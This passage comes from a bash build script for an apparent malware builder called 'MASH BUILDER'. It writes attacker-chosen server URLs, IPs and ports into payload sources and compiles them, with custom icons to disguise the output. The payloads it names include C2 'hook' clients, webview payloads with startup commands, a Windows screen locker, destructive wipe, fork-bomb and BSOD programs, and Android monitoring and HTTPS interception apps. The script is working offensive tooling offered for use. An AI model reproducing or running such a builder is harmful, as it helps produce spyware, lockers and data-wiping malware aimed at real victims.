        echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")"
        echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")"
        echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server URL: $(grep -oP 'const\s+std::string\s+SERVER_URL\s*=\s*"\K[^"]+' "$source_file")"
    fi
    
    # Get new variables
    if [ "$source_type" = "webview_pen.cpp" ]; then
        if [ -n "$REMOTE_SERVER_URL" ]; then
            new_url="$REMOTE_SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        if [ -n "$REMOTE_SERVER_PORT" ]; then
            new_port="$REMOTE_SERVER_PORT"
            echo -e "${GREEN}> Using command-line server port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new server port (current: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "remote_server_url" "$new_url" "cpp_string"
        fi
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "remote_server_port" "$new_port" "cpp_num"
        fi
    elif [ "$source_type" = "webview_pen2.cpp" ]; then
        if [ -n "$LAUNCH_MODE" ]; then
            new_mode="$LAUNCH_MODE"
            echo -e "${GREEN}> Using command-line launch mode: $new_mode${NC}"
        else
            echo -ne "${CYAN}Enter new launch mode (0=GUI, 1=Background, 2=CLI) (current: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_mode
        fi
        
        if [ -n "$SHOW_POPUP" ]; then
            new_popup="$SHOW_POPUP"
            echo -e "${GREEN}> Using command-line show popup: $new_popup${NC}"
        else
            echo -ne "${CYAN}Show popup? (true/false) (current: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")):${NC} "
            read new_popup
        fi
        
        if [ -n "$STARTUP_COMMAND" ]; then
            new_command="$STARTUP_COMMAND"
            echo -e "${GREEN}> Using command-line startup command: $new_command${NC}"
        else
            echo -ne "${CYAN}Enter new startup command (current: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_command
        fi
        
        if [ -n "$REMOTE_SERVER_URL" ]; then
            new_url="$REMOTE_SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        if [ -n "$REMOTE_SERVER_PORT" ]; then
            new_port="$REMOTE_SERVER_PORT"
            echo -e "${GREEN}> Using command-line server port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new server port (current: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -n "$new_mode" ]; then
            replace_var "$source_file" "LAUNCH_MODE" "$new_mode" "cpp_num"
        fi
        
        if [ -n "$new_popup" ]; then
            replace_var "$source_file" "SHOW_POPUP" "$new_popup" "cpp_bool"
        fi
        
        if [ -n "$new_command" ]; then
            replace_var "$source_file" "STARTUP_COMMAND" "$new_command" "cpp_string"
        fi
        
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "remote_server_url" "$new_url" "cpp_string"
        fi
        
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "remote_server_port" "$new_port" "cpp_num"
        fi
    else
        if [ -n "$LAUNCH_MODE" ]; then
            new_mode="$LAUNCH_MODE"
            echo -e "${GREEN}> Using command-line launch mode: $new_mode${NC}"
        else
            echo -ne "${CYAN}Enter new launch mode (0=GUI, 1=Background, 2=CLI) (current: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_mode
        fi
        
        if [ -n "$SHOW_POPUP" ]; then
            new_popup="$SHOW_POPUP"
            echo -e "${GREEN}> Using command-line show popup: $new_popup${NC}"
        else
            echo -ne "${CYAN}Show popup? (true/false) (current: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")):${NC} "
            read new_popup
        fi
        
        if [ -n "$STARTUP_COMMAND" ]; then
            new_command="$STARTUP_COMMAND"
            echo -e "${GREEN}> Using command-line startup command: $new_command${NC}"
        else
            echo -ne "${CYAN}Enter new startup command (current: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_command
        fi
        
        if [ -n "$SERVER_URL" ]; then
            new_url="$SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'const\s+std::string\s+SERVER_URL\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        # Update variables
        if [ -n "$new_mode" ]; then
            replace_var "$source_file" "LAUNCH_MODE" "$new_mode" "cpp_num"
        fi
        
        if [ -n "$new_popup" ]; then
            replace_var "$source_file" "SHOW_POPUP" "$new_popup" "cpp_bool"
        fi
        
        if [ -n "$new_command" ]; then
            replace_var "$source_file" "STARTUP_COMMAND" "$new_command" "cpp_string"
        fi
        
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "SERVER_URL" "$new_url" "cpp_string"
        fi
    fi
    
    # Show updated variables
    show_variable_changes "$source_file" "$source_type"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_WEBVIEW_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_WEBVIEW_NAME}
    fi
    
    # Ask for icon
    if [ -n "$ICON_PATH" ]; then
        icon_path="$ICON_PATH"
        echo -e "${GREEN}> Using command-line icon: $icon_path${NC}"
        add_icon="y"
    else
        echo -ne "${YELLOW}Add custom icon? (y/n):${NC} "
        read add_icon
        if [ "$add_icon" = "y" ]; then
            echo -ne "${CYAN}Enter path to icon image:${NC} "
            read icon_path
        fi
    fi
    res_file=""
    
    if [ "$add_icon" = "y" ] && [ -n "$icon_path" ]; then
        if [ -f "$icon_path" ]; then
            res_file=$(create_icon_resource "$icon_path")
            if [ $? -ne 0 ]; then
                res_file=""
            fi
        else
            echo -e "${RED}Icon file not found.${NC}"
        fi
    fi
    
    # Build
    if [ -n "$PLATFORM" ]; then
        platform_choice="$PLATFORM"
        echo -e "${GREEN}> Using command-line platform: $platform_choice${NC}"
    else
        echo "Select platform:"
        echo "1. Linux"
        echo "2. Windows"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read platform_choice
    fi
    
    build_success=false
    
    case $platform_choice in
        1|linux) 
            if run_with_spinner "g++ -o ${output_name} ${source_file} \
              -std=c++17 \
              -I./opencv_fix \
              -I/usr/include/opencv4 \
              -L/usr/lib/x86_64-linux-gnu \
              -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
              -lbluetooth \
              -lportaudio \
              -lssl -lcrypto \
              -lpthread \
              -lX11 -lXtst \
              -lboost_system \
              -lboost_thread \
              -I./webview/include -I./webview2_sdk/build/native/include \
              \`pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl\`"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        2|windows) 
            local compile_cmd="x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
${source_file} -mwindows -o ${output_name}.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs-static/lib \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread -lssl -lcrypto \
-lwinhttp -lbthprops -lportaudio -lwinmm \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lversion \
-lshlwapi -lurlmon -lgdiplus -lsetupapi -lksuser -lmswsock -liphlpapi -lws2_32 -limm32 \
-static-libgcc -static-libstdc++ -static -lwinpthread \
-D_WIN32 -D_WIN32_WINNT=0x0600 -DWIN32_LEAN_AND_MEAN"
            
            if [ -n "$res_file" ]; then
                compile_cmd="$compile_cmd $res_file"
            fi
            
            if run_with_spinner "$compile_cmd"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}.exe" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.exe${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        *) 
            echo -e "${RED}Invalid platform. Building for Linux.${NC}"
            if run_with_spinner "g++ -o ${output_name} ${source_file} \
              -std=c++17 \
              -I./opencv_fix \
              -I/usr/include/opencv4 \
              -L/usr/lib/x86_64-linux-gnu \
              -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
              -lbluetooth \
              -lportaudio \
              -lssl -lcrypto \
              -lpthread \
              -lX11 -lXtst \
              -lboost_system \
              -lboost_thread \
              -I./webview/include -I./webview2_sdk/build/native/include \
              \`pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl\`"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
    esac
    
    # Clean up temporary files
    if [ -n "$res_file" ]; then
        rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_java_payload() {
    echo -e "${YELLOW}Building $(get_payload_display_name "MegaClient.java")...${NC}"
    cd "$PC_DIR/java/MegaClient"
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    echo "Server URL: $(grep -oP 'private\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"\K[^"]+' MegaClient.java)"
    
    # Get new variables
    if [ -n "$SERVER_URL" ]; then
        new_url="$SERVER_URL"
        echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
    else
        echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'private\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"\K[^"]+' MegaClient.java)):${NC} "
        read new_url
    fi
    
    # Update variables
    if [ -n "$new_url" ]; then
        replace_var "MegaClient.java" "SERVER_URL" "$new_url" "java_string"
    fi
    
    # Show updated variables
    show_variable_changes "MegaClient.java" "MegaClient.java"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_JAVA_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_JAVA_NAME}
    fi
    
    # Build
    build_success=false
    if run_with_spinner "javac MegaClient.java && jar cfm ${output_name}.jar manifest.txt *.class"; then
        mkdir -p "$OUTPUT_DIR"
        cp -f "${output_name}.jar" "$OUTPUT_DIR/"
        echo -e "${GREEN}Build complete!${NC}"
        echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.jar${NC}"
        build_success=true
    else
        handle_error "Build failed!"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_java_game() {
    echo -e "${YELLOW}Building $(get_payload_display_name "GameClient.java")...${NC}"
    cd "$PC_DIR/java/GameClient"
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    echo "Server URL: $(grep -oP 'private\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"\K[^"]+' GameClient.java)"
    
    # Get new variables
    if [ -n "$SERVER_URL" ]; then
        new_url="$SERVER_URL"
        echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
    else
        echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'private\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"\K[^"]+' GameClient.java)):${NC} "
        read new_url
    fi
    
    # Update variables
    if [ -n "$new_url" ]; then
        replace_var "GameClient.java" "SERVER_URL" "$new_url" "java_string"
    fi
    
    # Show updated variables
    show_variable_changes "GameClient.java" "GameClient.java"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_JAVA_GAME_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_JAVA_GAME_NAME}
    fi
    
    # Build
    build_success=false
    if run_with_spinner "javac GameClient.java && jar cfm ${output_name}.jar manifest.txt *.class"; then
        mkdir -p "$OUTPUT_DIR"
        cp -f "${output_name}.jar" "$OUTPUT_DIR/"
        echo -e "${GREEN}Build complete!${NC}"
        echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.jar${NC}"
        build_success=true
    else
        handle_error "Build failed!"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_system_locker() {
    echo -e "${YELLOW}Building $(get_payload_display_name "syslock.cpp")...${NC}"
    cd "$PC_DIR/Locker"
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    echo "Password: $(grep -oP '#define\s+PASSWORD\s+L"\K[^"]+' syslock.cpp)"
    
    # Get new variables
    echo -ne "${CYAN}Enter new password (current: $(grep -oP '#define\s+PASSWORD\s+L"\K[^"]+' syslock.cpp)):${NC} "
    read new_pass
    
    # Update variables
    if [ -n "$new_pass" ]; then
        sed -i "s/#define PASSWORD L\"[^\"]*\"/#define PASSWORD L\"$new_pass\"/g" syslock.cpp
    fi
    
    # Show updated variables
    show_variable_changes "syslock.cpp" "syslock.cpp"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_LOCKER_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_LOCKER_NAME}
    fi
    
    # Ask for icon
    if [ -n "$ICON_PATH" ]; then
        icon_path="$ICON_PATH"
        echo -e "${GREEN}> Using command-line icon: $icon_path${NC}"
        add_icon="y"
    else
        echo -ne "${YELLOW}Add custom icon? (y/n):${NC} "
        read add_icon
        if [ "$add_icon" = "y" ]; then
            echo -ne "${CYAN}Enter path to icon image:${NC} "
            read icon_path
        fi
    fi
    res_file=""
    
    if [ "$add_icon" = "y" ] && [ -n "$icon_path" ]; then
        if [ -f "$icon_path" ]; then
            res_file=$(create_icon_resource "$icon_path")
            if [ $? -ne 0 ]; then
                res_file=""
            fi
        else
            echo -e "${RED}Icon file not found.${NC}"
        fi
    fi
    
    # Build
    build_success=false
    local compile_cmd="x86_64-w64-mingw32-g++ -g -o ${output_name}.exe syslock.cpp -mwindows -lshlwapi -lshell32 -ladvapi32 -lgdi32 -luser32 -lkernel32 -static -DUNICODE -D_UNICODE"
    
    if [ -n "$res_file" ]; then
        compile_cmd="$compile_cmd $res_file"
    fi
    
    if run_with_spinner "$compile_cmd"; then
        mkdir -p "$OUTPUT_DIR"
        cp -f "${output_name}.exe" "$OUTPUT_DIR/"
        echo -e "${GREEN}Build complete!${NC}"
        echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.exe${NC}"
        build_success=true
    else
        handle_error "Build failed!"
    fi
    
    # Clean up temporary files
    if [ -n "$res_file" ]; then
        rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_access_droid() {
    echo -e "${YELLOW}Building Access Droid...${NC}"
    echo "This feature is not yet implemented."
    read -p "Press Enter to continue..."
}

build_silent_apk() {
    echo -e "${YELLOW}Building Silent APK...${NC}"
    echo "This feature is not yet implemented."
    read -p "Press Enter to continue..."
}

build_https_capture() {
    echo -e "${YELLOW}Building HTTPS Capture...${NC}"
    echo "This feature is not yet implemented."
    read -p "Press Enter to continue..."
    build_mash_cross
}

build_hta_payload() {
    echo -e "${YELLOW}Building HTA Payload...${NC}"
    echo "This feature is not yet implemented."
    read -p "Press Enter to continue..."
    build_mash_doc
}

build_vbs_payload() {
    echo -e "${YELLOW}Building VBS Payload...${NC}"
    echo "This feature is not yet implemented."
    read -p "Press Enter to continue..."
    build_mash_doc
}

# Command-line argument parsing
show_usage() {
    echo "MASH BUILDER v1.0 - Command Line Interface"
    echo ""
    echo "Usage: $0 [options]"
    echo ""
    echo "Global Options:"
    echo "  -h, --help              Show this help message and exit"
    echo "  -c, --credits           Show credits and exit"
    echo "  -d, --debug             Enable debug mode"
    echo ""
    echo "Payload Type Options:"
    echo "  -b, --bull              Build BULL-DozzeR payload"
    echo "  -p, --pc                Build PC payload"
    echo "  -a, --android           Build Android payload"
    echo "  -x, --cross             Build cross-platform payload"
    echo "  -o, --doc               Build document payload"
    echo ""
    echo "BULL-DozzeR Options:"
    echo "  -t, --type TYPE         Payload type: annoying, wipe, forkbomb, silentwipe, bsod"
    echo "  -w, --windows           Build for Windows"
    echo "  -l, --linux             Build for Linux"
    echo "  -n, --name NAME         Output filename"
    echo "  -i, --icon PATH         Path to icon image"
    echo ""
    echo "PC Payload Options:"
    echo "  -s, --source SOURCE     Source file: hook.c, hook2.c, hook3.c, hook4.c, webview_pen.cpp, webview_pen2.cpp, webview_pen3.cpp, download.cpp, MegaClient.java, GameClient.java, syslock.cpp"
    echo "  -w, --windows           Build for Windows"
    echo "  -l, --linux             Build for Linux"
    echo "  -n, --name NAME         Output filename"
    echo "  -i, --icon PATH         Path to icon image"
    echo "  --server-ip IP          Server IP (for hook.c)"
    echo "  --server-port PORT      Server port (for hook.c)"
    echo "  --server-url URL        Server URL (for hook2.c, hook3.c, hook4.c)"
    echo "  --socket-host HOST      Socket host (for hook2.c, hook3.c, hook4.c)"
    echo "  --socket-port PORT      Socket port (for hook2.c, hook3.c, hook4.c)"
    echo "  --launch-mode MODE      Launch mode (for webview_pen2.cpp, webview_pen3.cpp)"
    echo "  --show-popup BOOL       Show popup (true/false) (for webview_pen2.cpp, webview_pen3.cpp)"
    echo "  --startup-command CMD  Startup command (for webview_pen2.cpp, webview_pen3.cpp)"
    echo "  --remote-server-url URL Remote server URL (for webview_pen.cpp, webview_pen2.cpp)"
    echo "  --remote-server-port PORT Remote server port (for webview_pen.cpp, webview_pen2.cpp)"
    echo ""
    echo "Android Payload Options:"
    echo "  -t, --type TYPE         Payload type: Monitor, Monitor2, Monitor3, HTTPSProxy"
    echo "  --main-url URL          Main server URL (for Monitor, Monitor2, Monitor3)"
    echo "  --stream-url URL        Streaming server URL (for Monitor, Monitor2, Monitor3)"
    echo "  --server-url URL        Server URL (for HTTPSProxy)"
    echo "  --target-website URL    Target website (for HTTPSProxy)"
    echo "  --app-name NAME         App name"
    echo "  --app-icon PATH         Path to app icon"
    echo ""
    echo "Cross-Platform Payload Options:"
    echo "  -t, --type TYPE         Payload type: https-capture"
    echo ""
    echo "Document Payload Options:"
    echo "  -t, --type TYPE         Payload type: hta, vbs"
    echo ""
    echo "Examples:"
    echo "  $0 -b -t annoying -w -n myannoying -i icon.png"
    echo "  $0 -p -s hook.c -w --server-ip 192.168.1.100 --server-port 8080 -n myhook"
    echo "  $0 -a -t Monitor --main-url wss://example.com --app-name MyApp"
    echo "  $0 -x -t https-capture"
    echo "  $0 -o -t hta"
    echo ""
    echo "Interactive Mode:"
    echo "  $0                     Run in interactive mode"
}

parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                show_usage
                exit 0
                ;;
            -c|--credits)
                mash_credits
                exit 0
                ;;
            -d|--debug)
                DEBUG=true
                shift
                ;;
            -b|--bull)
                PAYLOAD_TYPE="bull"
                shift
                ;;
            -p|--pc)
                PAYLOAD_TYPE="pc"
                shift
                ;;
            -a|--android)
                PAYLOAD_TYPE="android"
                shift
                ;;
            -x|--cross)
                PAYLOAD_TYPE="cross"
                shift
                ;;
            -o|--doc)
                PAYLOAD_TYPE="doc"
                shift
                ;;
            -t|--type)
                if [ -z "$PAYLOAD_TYPE" ]; then
                    echo "Error: Payload type must be specified before -t"
                    exit 1
                fi
                case "$PAYLOAD_TYPE" in
                    bull)
                        BULL_TYPE="$2"
                        ;;
                    pc)
                        PC_SOURCE="$2"
                        ;;
                    android)
                        ANDROID_TYPE="$2"
                        ;;
                    cross)
                        CROSS_TYPE="$2"
                        ;;
                    doc)
                        DOC_TYPE="$2"
                        ;;
                esac
                shift 2
                ;;
            -w|--windows)
                PLATFORM="windows"
                shift
                ;;
            -l|--linux)
                PLATFORM="linux"
                shift
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -i|--icon)
                ICON_PATH="$2"
                shift 2
                ;;
            -s|--source)
                PC_SOURCE="$2"
                shift 2
                ;;
            --server-ip)
                SERVER_IP="$2"
                shift 2
                ;;
            --server-port)
                SERVER_PORT="$2"
                shift 2
                ;;
            --server-url)
                SERVER_URL="$2"
                shift 2
                ;;
            --socket-host)
                SOCKET_HOST="$2"
                shift 2
                ;;
            --socket-port)
                SOCKET_PORT="$2"
                shift 2
                ;;
            --launch-mode)
                LAUNCH_MODE="$2"
                shift 2
                ;;
            --show-popup)
                SHOW_POPUP="$2"
                shift 2
                ;;
            --startup-command)
                STARTUP_COMMAND="$2"
                shift 2
                ;;
            --remote-server-url)
                REMOTE_SERVER_URL="$2"
                shift 2
                ;;
            --remote-server-port)
                REMOTE_SERVER_PORT="$2"
                shift 2
                ;;
            --main-url)
                MAIN_URL="$2"
                shift 2
                ;;
            --stream-url)
                STREAM_URL="$2"
                shift 2
                ;;
            --https-proxy-server-url)
                HTTPS_PROXY_SERVER_URL="$2"
                shift 2
                ;;
            --https-proxy-target-website)
                HTTPS_PROXY_TARGET_WEBSITE="$2"
                shift 2
                ;;
            --app-name)
                APP_NAME="$2"
                shift 2
                ;;
            --app-icon)
                APP_ICON_PATH="$2"
                shift 2
                ;;
            *)
                echo "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Main script execution
# Load configuration at startup
load_config

# Check if we have command-line arguments
if [ $# -gt 0 ]; then
    parse_arguments "$@"
    
    # Process the command-line arguments
    case "$PAYLOAD_TYPE" in
        bull)
            if [ -z "$BULL_TYPE" ]; then
                echo "Error: BULL type not specified"
                show_usage
                exit 1
            fi
            
            if [ -z "$PLATFORM" ]; then
                echo "Error: Platform not specified"
                show_usage
                exit 1
            fi
            
            # Map BULL_TYPE to choice number
            case "$BULL_TYPE" in
                annoying)
                    choice=1
                    default_name="$BULL_ANNOYING_NAME"
                    ;;
                wipe)
                    choice=2
                    default_name="$BULL_WIPE_NAME"
                    ;;
                forkbomb)
                    choice=3
                    default_name="$BULL_FORKBOMB_NAME"
                    ;;
                silentwipe)
                    choice=4
                    default_name="$BULL_SILENTWIPE_NAME"
                    ;;
                bsod)
                    choice=5
                    default_name="$BULL_BSOD_NAME"
                    ;;
                *)
                    echo "Error: Invalid BULL type: $BULL_TYPE"
                    show_usage
                    exit 1
                    ;;
            esac
            
            # Set output_name if not provided
            if [ -z "$OUTPUT_NAME" ]; then
                output_name="$default_name"
            else
                output_name="$OUTPUT_NAME"
            fi
            
            # For BSOD, force Windows
            if [ "$choice" -eq 5 ]; then
                if [ "$PLATFORM" != "windows" ]; then
                    echo "Warning: BSOD is Windows-only. Building for Windows."
                    PLATFORM="windows"
                fi
            fi
            
            # Set compiler and extension based on platform
            case "$PLATFORM" in
                windows)
                    compiler="x86_64-w64-mingw32-gcc"
                    extension=".exe"
                    target="Windows"
                    ;;
                linux)
                    compiler="gcc"
                    extension=""
                    target="Linux"
                    ;;
                *)
                    echo "Error: Invalid platform: $PLATFORM"
                    exit 1
                    ;;
            esac
            
            # Change to BULL_DIR
            cd "$BULL_DIR" || handle_error "Failed to change to $BULL_DIR"
            
            # Set source file based on choice
            case $choice in
                1)
                    source_file="annoying.c"
                    ;;
                2)
                    source_file="wipe.c"
                    ;;
                3)
                    source_file="forkbomb.c"
                    ;;
                4)
                    source_file="silentwipe.c"
                    ;;
                5)
                    source_file="BSOD.c"
                    ;;
            esac
            
            # Add extension if not present
            if [ "$PLATFORM" = "windows" ] && [[ "$output_name" != *".exe" ]]; then
                output_name="$output_name.exe"
            fi
            
            # Handle icon
            res_file=""
            if [ -n "$ICON_PATH" ]; then
                if [ -f "$ICON_PATH" ]; then
                    res_file=$(create_icon_resource "$ICON_PATH")
                    if [ $? -ne 0 ]; then
                        echo "Warning: Failed to create icon resource"
                        res_file=""
                    fi
                else
                    echo "Warning: Icon file not found: $ICON_PATH"
                fi
            fi
            
            echo "Building $output_name for $target..."
            
            # Build command
            build_cmd="$compiler -o $output_name $source_file"
            if [ -n "$res_file" ]; then
                build_cmd="$build_cmd $res_file"
            fi
            
            if run_with_spinner "$build_cmd"; then
                # Create output directory if it doesn't exist
                mkdir -p "$OUTPUT_DIR"
                cp -f "$output_name" "$OUTPUT_DIR/" || handle_error "Failed to copy output file"
                echo "Build complete! $output_name created for $target"
                echo "> Output saved to: $OUTPUT_DIR/$output_name"
            else
                handle_error "Build failed!"
            fi
            
            # Clean up temporary files
            if [ -n "$res_file" ]; then
                rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
            fi
            ;;
        pc)
            if [ -z "$PC_SOURCE" ]; then
                echo "Error: PC source file not specified"
                show_usage
                exit 1
            fi
            
            # Determine source file and type
            case "$PC_SOURCE" in
                hook.c)
                    source_file="hook.c"
                    source_type="hook.c"
                    ;;
                hook2.c)
                    source_file="hook2.c"
                    source_type="hook2.c"
                    ;;
                hook3.c)
                    source_file="hook3.c"
                    source_type="hook3.c"
                    ;;
                hook4.c)
                    source_file="hook4.c"
                    source_type="hook4.c"
                    ;;
                webview_pen.cpp)
                    source_file="webview_pen.cpp"
                    source_type="webview_pen.cpp"
                    ;;
                webview_pen2.cpp)
                    source_file="webview_pen2.cpp"
                    source_type="webview_pen2.cpp"
                    ;;
                webview_pen3.cpp)
                    source_file="webview_pen3.cpp"
                    source_type="webview_pen3.cpp"
                    ;;
                download.cpp)
                    source_file="download.cpp"
                    source_type="download.cpp"
                    ;;
                MegaClient.java)
                    source_file="MegaClient.java"
                    source_type="MegaClient.java"
                    ;;
                GameClient.java)
                    source_file="GameClient.java"
                    source_type="GameClient.java"
                    ;;
                syslock.cpp)
                    source_file="syslock.cpp"
                    source_type="syslock.cpp"
                    ;;
                *)
                    echo "Error: Invalid PC source file: $PC_SOURCE"
                    show_usage
                    exit 1
                    ;;
            esac
            
            # Change to PC_DIR
            cd "$PC_DIR" || handle_error "Failed to change to $PC_DIR"
            
            # Handle different payload types
            case "$source_type" in
                hook.c)
                    # Update server IP and port if provided
                    if [ -n "$SERVER_IP" ]; then
                        sed -i "s/char server_ip[16] = \"[^\"]*\"/char server_ip[16] = \"$SERVER_IP\"/g" "$source_file"
                    fi
                    
                    if [ -n "$SERVER_PORT" ]; then
                        replace_var "$source_file" "SERVER_PORT" "$SERVER_PORT" "c_define_num"
                    fi
                    ;;
                hook2.c|hook3.c|hook4.c)
                    # Update server URL, socket host and port if provided
                    if [ -n "$SERVER_URL" ]; then
                        replace_var "$source_file" "SERVER_URL" "$SERVER_URL" "c_define"
                    fi
                    
                    if [ -n "$SOCKET_HOST" ]; then
                        replace_var "$source_file" "SOCKET_HOST" "$SOCKET_HOST" "c_define"
                    fi
                    
                    if [ -n "$SOCKET_PORT" ]; then
                        replace_var "$source_file" "SOCKET_PORT" "$SOCKET_PORT" "c_define_num"
                    fi
                    ;;
                webview_pen.cpp)
                    # Update remote server URL and port if provided
                    if [ -n "$REMOTE_SERVER_URL" ]; then
                        replace_var "$source_file" "remote_server_url" "$REMOTE_SERVER_URL" "cpp_string"
                    fi
                    
                    if [ -n "$REMOTE_SERVER_PORT" ]; then
                        replace_var "$source_file" "remote_server_port" "$REMOTE_SERVER_PORT" "cpp_num"
                    fi
                    ;;
                webview_pen2.cpp)
                    # Update launch mode, show popup, startup command, remote server URL and port if provided
                    if [ -n "$LAUNCH_MODE" ]; then
                        replace_var "$source_file" "LAUNCH_MODE" "$LAUNCH_MODE" "cpp_num"
                    fi
                    
                    if [ -n "$SHOW_POPUP" ]; then
                        replace_var "$source_file" "SHOW_POPUP" "$SHOW_POPUP" "cpp_bool"
                    fi
                    
                    if [ -n "$STARTUP_COMMAND" ]; then
                        replace_var "$source_file" "STARTUP_COMMAND" "$STARTUP_COMMAND" "cpp_string"
                    fi
                    
